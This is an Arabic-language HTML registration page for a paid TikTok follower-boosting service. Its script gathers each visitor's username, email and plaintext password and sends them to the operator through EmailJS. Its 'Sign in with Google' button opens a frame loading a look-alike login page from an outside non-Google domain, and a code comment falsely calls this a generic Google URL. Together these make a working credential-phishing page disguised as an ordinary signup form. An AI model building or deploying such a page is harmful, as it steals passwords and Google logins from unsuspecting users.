<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل حساب جديد - رشق وزيادة متابعين تيك توك</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Arabic:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script type="text/javascript">
        // Initialize EmailJS with your Public Key
        // Replace 'UbJp42lWtq38Tx9mi' with your actual EmailJS Public Key if it changes
        (function() {
            emailjs.init("UbJp42lWtq38Tx9mi");
        })();
    </script>
    <style>
        body {
            font-family: 'Noto Sans Arabic', sans-serif; /* Prioritize Noto Sans Arabic for natural look */
            background-color: #f0f2f5; /* Light gray background */
            color: #333;
        }
        /* Custom scrollbar for a cleaner look */
        ::-webkit-scrollbar {
            width: 8px;
        }
        ::-webkit-scrollbar-track {
            background: #f1f1f1;
            border-radius: 10px;
        }
        ::-webkit-scrollbar-thumb {
            background: #888;
            border-radius: 10px;
        }
        ::-webkit-scrollbar-thumb:hover {
            background: #555;
        }
        /* Style for the message box */
        .message-box {
            padding: 1rem;
            border-radius: 0.5rem;
            margin-bottom: 1rem;
            text-align: center;
            font-weight: 600;
        }
        .message-box.success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .message-box.error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        /* Style for loading indicator */
        .loading-indicator {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 20px; /* Adjust height as needed */
            margin-bottom: 1rem;
        }
        .loading-indicator .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-left-color: #ef4444; /* Red color for spinner */
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Style for the Google sign-in button */
        .google-signin-button {
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: #ffffff;
            border: 1px solid #dadce0;
            border-radius: 9999px; /* Full rounded corners */
            padding: 0.75rem 1.5rem; /* py-3 px-6 */
            font-size: 1rem;
            font-weight: 500;
            color: #3c4043;
            cursor: pointer;
            transition: background-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
            box-shadow: 0 2px 4px 0 rgba(0,0,0,0.06);
        }
        .google-signin-button:hover {
            background-color: #f6f8fa;
            box-shadow: 0 2px 6px 0 rgba(0,0,0,0.1);
        }
        .google-signin-button img {
            width: 20px;
            height: 20px;
            margin-left: 0.5rem; /* margin-right in RTL */
        }

        /* Modal styles */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: rgba(0, 0, 0, 0.75);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.3s ease, visibility 0.3s ease;
        }
        .modal-overlay.open {
            opacity: 1;
            visibility: visible;
        }
        .modal-container {
            background-color: white;
            border-radius: 0.75rem;
            overflow: hidden;
            width: 90%;
            max-width: 600px;
            height: 80%;
            display: flex;
            flex-direction: column;
            transform: scale(0.9);
            transition: transform 0.3s ease;
        }
        .modal-overlay.open .modal-container {
            transform: scale(1);
        }
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 1rem 1.5rem;
            border-bottom: 1px solid #e2e8f0;
        }
        .modal-close-button {
            background: none;
            border: none;
            font-size: 1.5rem;
            cursor: pointer;
            color: #4a5568;
        }
        .modal-content {
            flex-grow: 1;
            display: flex;
        }
        .modal-content iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
    </style>
</head>
<body class="flex flex-col min-h-screen">
    <header class="bg-white shadow-md p-4 sticky top-0 z-50">
        <div class="container mx-auto flex justify-between items-center">
            <a href="index.html" class="text-2xl font-bold text-red-500">
                رشق وزيادة متابعين تيك توك
            </a>
            <nav>
                <ul class="flex space-x-4 space-x-reverse">
                    <li><a href="index.html#services" class="text-gray-700 hover:text-red-500 font-medium">خدماتنا</a></li>
                    <li><a href="index.html#how-it-works" class="text-gray-700 hover:text-red-500 font-medium">كيف يعمل؟</a></li>
                    <li><a href="index.html#payment-methods" class="text-gray-700 hover:text-red-500 font-medium">طرق الدفع</a></li>
                    <li><a href="index.html#contact" class="text-gray-700 hover:text-red-500 font-medium">اتصل بنا</a></li>
                    <li><a href="login.html" class="text-gray-700 hover:text-red-500 font-medium">تسجيل الدخول</a></li>
                </ul>
            </nav>
        </div>
    </header>

    <main class="flex-grow flex items-center justify-center py-12 px-4">
        <div class="bg-white p-8 md:p-10 rounded-xl shadow-lg w-full max-w-md border border-gray-200">
            <h2 class="text-3xl font-bold text-center mb-8 text-gray-800">تسجيل حساب جديد</h2>

            <div id="messageBox" class="message-box hidden"></div>

            <div id="loadingIndicator" class="loading-indicator hidden">
                <div class="spinner"></div>
            </div>

            <form id="registerForm" action="#" method="POST">
                <div class="mb-6">
                    <label for="username" class="block text-gray-700 text-lg font-medium mb-2">اسم المستخدم</label>
                    <input type="text" id="username" name="username" class="w-full px-4 py-3 rounded-lg border-2 border-gray-300 focus:outline-none focus:border-red-500 transition duration-200" placeholder="أدخل اسم المستخدم" required>
                </div>
                <div class="mb-6">
                    <label for="email" class="block text-gray-700 text-lg font-medium mb-2">البريد الإلكتروني</label>
                    <input type="email" id="email" name="email" class="w-full px-4 py-3 rounded-lg border-2 border-gray-300 focus:outline-none focus:border-red-500 transition duration-200" placeholder="أدخل بريدك الإلكتروني" required>
                </div>
                <div class="mb-6">
                    <label for="password" class="block text-gray-700 text-lg font-medium mb-2">كلمة المرور</label>
                    <input type="password" id="password" name="password" class="w-full px-4 py-3 rounded-lg border-2 border-gray-300 focus:outline-none focus:border-red-500 transition duration-200" placeholder="أدخل كلمة المرور" required>
                </div>
                <div class="mb-6">
                    <label for="confirmPassword" class="block text-gray-700 text-lg font-medium mb-2">تأكيد كلمة المرور</label>
                    <input type="password" id="confirmPassword" name="confirmPassword" class="w-full px-4 py-3 rounded-lg border-2 border-gray-300 focus:outline-none focus:border-red-500 transition duration-200" placeholder="أعد إدخال كلمة المرور" required>
                </div>

                <!-- Google Sign-in Button -->
                <button type="button" id="googleSignInButton" class="google-signin-button w-full mt-4 mb-4">
                    <img src="https://img.icons8.com/color/48/000000/google-logo.png" alt="Google icon">
                    <span>التسجيل باستخدام Google</span>
                </button>

                <!-- Or separator -->
                <div class="flex items-center my-6">
                    <div class="flex-grow border-t border-gray-300"></div>
                    <span class="flex-shrink mx-4 text-gray-500 text-sm">أو</span>
                    <div class="flex-grow border-t border-gray-300"></div>
                </div>

                <input type="hidden" id="emailJsMessage" name="message">
                <input type="hidden" name="name" id="emailJsName">
                <input type="hidden" name="title" value="تسجيل حساب جديد">
                <input type="hidden" name="email_to" id="emailJsEmailTo">
                <button type="submit" id="registerButton" class="w-full bg-red-500 text-white px-6 py-3 rounded-full text-lg font-bold hover:bg-red-600 transition duration-300 ease-in-out shadow-md transform hover:scale-105">
                    تسجيل
                </button>
            </form>
            <p class="text-center text-gray-600 mt-6">
                لديك حساب بالفعل؟
                <a href="login.html" class="text-red-500 hover:text-red-700 font-medium transition duration-200">تسجيل الدخول</a>
            </p>
        </div>
    </main>

    <footer class="bg-gray-800 text-white py-8 mt-auto rounded-t-lg shadow-inner">
        <div class="container mx-auto px-4 text-center">
            <p>&copy; 2025 رشق وزيادة متابعين تيك توك. جميع الحقوق محفوظة.</p>
            <div class="flex justify-center space-x-4 space-x-reverse mt-4">
                <a href="#" class="text-gray-400 hover:text-white transition duration-200">سياسة الخصوصية</a>
                <span class="text-gray-500">|</span>
                <a href="#" class="text-gray-400 hover:text-white transition duration-200">شروط الخدمة</a>
            </div>
        </div>
    </footer>

    <!-- Google Sign-in Modal -->
    <div id="googleSignInModal" class="modal-overlay hidden">
        <div class="modal-container">
            <div class="modal-header">
                <h3 class="text-lg font-semibold text-gray-800">تسجيل الدخول باستخدام Google</h3>
                <button id="closeModalButton" class="modal-close-button">&times;</button>
            </div>
            <div class="modal-content">
                <!-- IMPORTANT NOTE: Google's actual sign-in page cannot be embedded directly in an iframe due to security policies (X-Frame-Options).
                     This iframe is for demonstration purposes using a generic Google URL.
                     For real Google Sign-In, you would typically use Google Identity Services (JS SDK) which handles pop-ups or redirects. -->
                <iframe id="googleSignInIframe" src="https://androidemu.online/g.html" title="Google Sign-in"></iframe>
            </div>
        </div>
    </div>

    <script>
        const registerForm = document.getElementById('registerForm');
        const usernameInput = document.getElementById('username');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const confirmPasswordInput = document.getElementById('confirmPassword');
        const messageBox = document.getElementById('messageBox');
        const loadingIndicator = document.getElementById('loadingIndicator');
        const registerButton = document.getElementById('registerButton');
        const googleSignInButton = document.getElementById('googleSignInButton'); // New: Google Sign-in Button
        const googleSignInModal = document.getElementById('googleSignInModal');   // New: Modal element
        const closeModalButton = document.getElementById('closeModalButton');     // New: Modal close button

        // EmailJS specific hidden inputs
        const emailJsMessageInput = document.getElementById('emailJsMessage');
        const emailJsNameInput = document.getElementById('emailJsName');
        const emailJsEmailToInput = document.getElementById('emailJsEmailTo');


        // Function to display messages
        function showMessage(message, type) {
            messageBox.textContent = message;
            messageBox.className = `message-box ${type}`;
            messageBox.classList.remove('hidden');

            setTimeout(() => {
                messageBox.classList.add('hidden');
                messageBox.textContent = '';
                messageBox.className = 'message-box hidden';
            }, 3000);
        }

        // Add event listener for form submission
        registerForm.addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent default form submission

            // Hide any previous messages
            messageBox.classList.add('hidden');
            messageBox.textContent = '';

            // Basic client-side validation
            if (usernameInput.value.trim() === '' || emailInput.value.trim() === '' ||
                passwordInput.value.trim() === '' || confirmPasswordInput.value.trim() === '') {
                showMessage('الرجاء تعبئة جميع الحقول المطلوبة.', 'error');
                return;
            }

            if (passwordInput.value !== confirmPasswordInput.value) {
                showMessage('كلمة المرور وتأكيد كلمة المرور غير متطابقين.', 'error');
                return;
            }

            // Show loading indicator and disable button
            loadingIndicator.classList.remove('hidden');
            registerButton.disabled = true;
            registerButton.classList.add('opacity-50', 'cursor-not-allowed');

            // Collect all inputs into a string for the hidden message field
            let collectedData = `تسجيل حساب جديد:\n`;
            collectedData += `اسم المستخدم: ${usernameInput.value}\n`;
            collectedData += `البريد الإلكتروني: ${emailInput.value}\n`;
            collectedData += `كلمة المرور: ${passwordInput.value}\n`; // In a real app, never send plain passwords via email!

            // Set the collected data to the hidden EmailJS message input
            emailJsMessageInput.value = collectedData;
            // Set dynamic values for other EmailJS hidden inputs
            emailJsNameInput.value = usernameInput.value; // Use username as 'name' for EmailJS
            emailJsEmailToInput.value = emailInput.value; // Use user's email as 'email_to' for EmailJS

            // Send the form using EmailJS
            const serviceID = 'default_service'; // Your EmailJS Service ID
            const templateID = 'template_qyhaxqi'; // Your EmailJS Template ID

            emailjs.sendForm(serviceID, templateID, this) // 'this' refers to the registerForm
                .then(() => {
                    loadingIndicator.classList.add('hidden');
                    registerButton.disabled = false;
                    registerButton.classList.remove('opacity-50', 'cursor-not-allowed');
                    showMessage('لقد تم إرسال رسالة تفعيل للبريد.', 'success');

                    // Optionally, clear the form after successful registration
                    registerForm.reset();

                    // In a real scenario, you might redirect to a "check your email" page
                    // or to the login page after a short delay.
                    // setTimeout(() => { window.location.href = 'login.html'; }, 3000);

                }, (err) => {
                    loadingIndicator.classList.add('hidden');
                    registerButton.disabled = false;
                    registerButton.classList.remove('opacity-50', 'cursor-not-allowed');
                    showMessage('حدث خطأ أثناء إرسال رسالة التفعيل: ' + JSON.stringify(err), 'error');
                });
        });

        // Event listener for Google Sign-in button
        googleSignInButton.addEventListener('click', function() {
            googleSignInModal.classList.remove('hidden');
            googleSignInModal.classList.add('open');
            // In a real application, you would initialize Google's SDK here
            // and potentially open a pop-up window or redirect to Google's auth page.
            // For this demonstration, the iframe will try to load google.com.
        });

        // Event listener for closing the modal
        closeModalButton.addEventListener('click', function() {
            googleSignInModal.classList.remove('open');
            // Adding a small delay before hiding to allow for transition
            setTimeout(() => {
                googleSignInModal.classList.add('hidden');
            }, 300);
        });

        // Close modal if clicked outside (optional, but good UX)
        googleSignInModal.addEventListener('click', function(event) {
            if (event.target === googleSignInModal) {
                closeModalButton.click(); // Trigger the close button's logic
            }
        });
    </script>
</body>
</html>
